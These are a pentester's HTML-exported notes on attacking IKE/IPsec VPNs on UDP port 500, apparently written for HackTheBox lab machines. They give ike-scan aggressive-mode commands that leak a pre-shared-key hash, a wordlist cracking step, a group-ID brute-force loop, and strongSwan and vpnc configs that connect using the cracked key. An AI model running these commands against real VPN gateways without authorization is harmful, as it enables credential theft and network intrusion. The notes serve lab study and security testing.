<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ike-vpn</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>ike-vpn</h1><br/><p><h2>Intro</h2><ul><li>IKE is a type of ISAKMP (internet security asscoiation key management protocol)</li><li>IKE establishes the security association (SA) between two endpoints through a three-phase process</li><li>VPN</li><li>port 500</li><li></li></ul></p><p><h2>pentesting port 500 UDP (IKE)</h2><h3></h3></p><p><h3></h3><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># Determine the IKE implementation and configuration that the host is using</span><br />ike-scan -M <span style="color:#7f0044;font-weight:400">$target</span><br /><span style="color:#0088ff;font-weight:400"># agressive mode scan for leak of users </span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> ike-scan -A <span style="color:#7f0044;font-weight:400">$target</span><br /><span style="color:#0088ff;font-weight:400"># crack password </span><br /><br /><span style="color:#ff9d00;font-weight:700">sudo</span> ike-scan -A <span style="color:#7f0044;font-weight:400">$target</span> --id=ike@expressway.htb -Pfile.psk<br /><span style="color:#0088ff;font-weight:400">## -P file save the psk cracking file</span><br /><span style="color:#0088ff;font-weight:400"># crack password</span><br />ike-psk -d <span style="color:#7f0044;font-weight:400">$rockyou</span>.txt file.psk<br /><span style="color:#0088ff;font-weight:400"># add password in /etc/ipsec.secrets</span><br />10.10.14.7 10.10.10.116 <span style="color:#ff9d00;font-weight:700">:</span> PSK <span style="color:#3ad900;font-weight:400">&quot;Dudecake1!&quot;</span><br /><span style="color:#0088ff;font-weight:400"># add entry /etc/ipsec.conf relative to ike -scan </span><br /><br />config setup<br />    <span style="color:#7f0044;font-weight:400">charondebug</span>=<span style="color:#3ad900;font-weight:400">&quot;all&quot;</span><br />    <span style="color:#7f0044;font-weight:400">uniqueids</span>=yes<br />    <span style="color:#7f0044;font-weight:400">strictcrlpolicy</span>=no<br /><br />conn conceal<br />    <span style="color:#7f0044;font-weight:400">authby</span>=secret<br />    <span style="color:#7f0044;font-weight:400">auto</span>=add<br />    <span style="color:#7f0044;font-weight:400">ike</span>=3des-sha1-modp1024!<br />    <span style="color:#7f0044;font-weight:400">esp</span>=3des-sha1!<br />    <span style="color:#7f0044;font-weight:400">type</span>=transport<br />    <span style="color:#7f0044;font-weight:400">keyexchange</span>=ikev1<br />    <span style="color:#7f0044;font-weight:400">left</span>=10.10.14.15<br />    <span style="color:#7f0044;font-weight:400">right</span>=10.10.10.116<br />    <span style="color:#7f0044;font-weight:400">rightsubnet</span>=10.10.10.116[tcp]<br />        <br />        <br /> <span style="color:#0088ff;font-weight:400"># start vpn </span><br /> ipsec up test </pre></div></p><p> </p><p> </p><p> </p><p> </p><p> * ike-scan -M &lt;ip&gt; <ul><li>.</li></ul></p><p> *  0 returned handshake; 0 returned notify: This means the target is not an IPsec gateway</p><p> *   1 returned handshake; 0 returned notify: This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you proposed are acceptabl</p><p> * 500 = VPN</p><p> </p><p> * phase 1 : secure channel through PSK or certficates</p><p> * transformation = Enc Type , Hash Type , Auth Type , DH Group</p><p> * command hash bruteforce</p><p> * ike-scan -P -M -A -n fakeID &lt;IP&gt;</p><p> *  while read line; do (echo &quot;Found ID: $line&quot; &amp;&amp; sudo ike-scan -M -A -n $line &lt;IP&gt;) | grep -B14 &quot;1 returned handshake&quot; | grep &quot;Found ID:&quot;; done &lt; /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt*</p><p> * VPN authentication commands :in kali with vpnc</p><p> </p><p>  bash</p><p> root@kali:\~# cat &gt; /etc/vpnc/vpntest.conf &lt;&lt; STOP</p><p> IPSec gateway 10.0.0.250</p><p> IPSec ID vpntest</p><p> IPSec secret groupsecret123</p><p> IKE Authmode psk</p><p> Xauth username chris</p><p> Xauth password tiffers1</p><p> STOP</p><p> root@kali:\~# vpnc vpntest</p><p> VPNC started in background (pid: 6980)</p><p> root@kali:\~# ifconfig tun0</p><p> </p><p> </p><p> </p><p> * authentication with strongswan</p><p> * /etc/ipsec.conf</p><p> ``conn rick-to-conceal</p><p>         authby=secret</p><p>         auto=route</p><p>         keyexchange=ikev1</p><p>         ike=3des-sha1-modp1024</p><p>         left=10.10.xx.xx</p><p>         right=10.10.10.116</p><p>         type=transport</p><p>         esp=3des-sha1-modp1024</p><p>         fragmentation=yes</p><p>         rightprotoport=tcp</p><p> ``</p><p> </p><p> * /etc/ipsec.secrets</p><p> * 10.10.16.167 10.10.10.116 : PSK &quot;Dudecake1!&quot;</p><p> * ipsec start</p><p> * ipsec up rick-to-conceal</p><p> </p></div>
</body>
</html>
